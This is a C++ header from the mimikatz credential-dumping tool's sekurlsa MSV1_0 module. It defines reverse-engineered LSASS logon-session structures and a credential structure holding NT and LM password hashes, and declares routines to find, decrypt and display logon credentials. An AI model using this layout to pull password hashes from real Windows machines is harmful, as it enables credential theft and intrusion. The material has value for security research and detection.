/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#pragma once
#include "../mod_mimikatz_sekurlsa.h"

class mod_mimikatz_sekurlsa_msv1_0 {

private:
	typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS {
		PVOID unk0; // next?
		LSA_UNICODE_STRING Primary;
		LSA_UNICODE_STRING Credentials;
	} KIWI_MSV1_0_PRIMARY_CREDENTIALS, *PKIWI_MSV1_0_PRIMARY_CREDENTIALS;

	typedef struct _KIWI_MSV1_0_CREDENTIALS {
		PVOID unk0; // next?
		DWORD AuthenticationPackageId;
		PVOID PrimaryCredentials;
	} KIWI_MSV1_0_CREDENTIALS, *PKIWI_MSV1_0_CREDENTIALS;

	typedef struct _KIWI_MSV1_0_LIST_5 {
		struct _KIWI_MSV1_0_LIST_5 *Flink;
		struct _KIWI_MSV1_0_LIST_5 *Blink;
		LUID LocallyUniqueIdentifier;
		LSA_UNICODE_STRING UserName;
		LSA_UNICODE_STRING Domaine;
		PVOID unk14; // 0
		PVOID unk15; // 0
		PVOID unk16; // offset unk_181A080
		DWORD unk17; // 0Ah
		DWORD unk18; // 2
	#ifdef _M_IX86
		DWORD unk19;
	#endif
		DWORD unk20; // 5AC4186Ch
		DWORD unk21; // 1CD6BFDh
		LSA_UNICODE_STRING LogonServer;
		PKIWI_MSV1_0_CREDENTIALS Credentials;
		PVOID unk22; // 0C14h
		PVOID unk23; // 0BFCh
	} KIWI_MSV1_0_LIST_5, *PKIWI_MSV1_0_LIST_5;

	typedef struct _KIWI_MSV1_0_LIST_6 {
		struct _KIWI_MSV1_0_LIST_6 *Flink;
		struct _KIWI_MSV1_0_LIST_6 *Blink;
		PVOID unk0;	// unk_18457A0
		DWORD unk1; // 0FFFFFFFFh
		DWORD unk2; // 0
		PVOID unk3; // 0
		PVOID unk4; // 0
		PVOID unk5; // 0
		PVOID unk6; // 0C04h
		PVOID unk7; // 0
		PVOID unk8; // 0C08h
		PVOID unk9; // 0
		PVOID unk10; // 0
		DWORD unk11; // 0
		DWORD unk12; // 0
		PVOID unk13; // offset off_18456A0
		LUID LocallyUniqueIdentifier;
		LUID SecondaryLocallyUniqueIdentifier;
		LSA_UNICODE_STRING UserName;
		LSA_UNICODE_STRING Domaine;
		PVOID unk14; // 0		Windows  8 + 2*PVOID / 4*PVOID!!
		PVOID unk15; // 0
		PVOID unk16; // offset unk_181A080
		DWORD unk17; // 0Ah
		DWORD unk18; // 2
	#ifdef _M_IX86
		DWORD unk19;
	#endif
		DWORD unk20; // 5AC4186Ch
		DWORD unk21; // 1CD6BFDh
		LSA_UNICODE_STRING LogonServer;
		PKIWI_MSV1_0_CREDENTIALS Credentials;
		PVOID unk22; // 0C14h
		PVOID unk23; // 0BFCh
	} KIWI_MSV1_0_LIST_6, *PKIWI_MSV1_0_LIST_6;

	typedef struct _MSV1_0_PRIMARY_CREDENTIAL { 
		LSA_UNICODE_STRING LogonDomainName; 
		LSA_UNICODE_STRING UserName; 
		BYTE NtOwfPassword[0x10];
		BYTE LmOwfPassword[0x10];
		BOOLEAN NtPasswordPresent; 
		BOOLEAN LmPasswordPresent;
		wchar_t BuffDomaine[MAX_DOMAIN_LEN];
		wchar_t BuffUserName[MAX_USERNAME_LEN];
	} MSV1_0_PRIMARY_CREDENTIAL, *PMSV1_0_PRIMARY_CREDENTIAL; 

	static void NlpMakeRelativeOrAbsoluteString(PVOID BaseAddress, PLSA_UNICODE_STRING String, bool relative = true);

	static PLIST_ENTRY LogonSessionList;
	static PULONG LogonSessionListCount;
	static bool searchLogonSessionList();

	static bool decryptAndDisplayCredsBlock(LSA_UNICODE_STRING * monBlock, bool justSecurity);
public:
	static bool getMSV(vector<wstring> * arguments);
	static bool WINAPI getMSVLogonData(__in PLUID logId, __in bool justSecurity);
};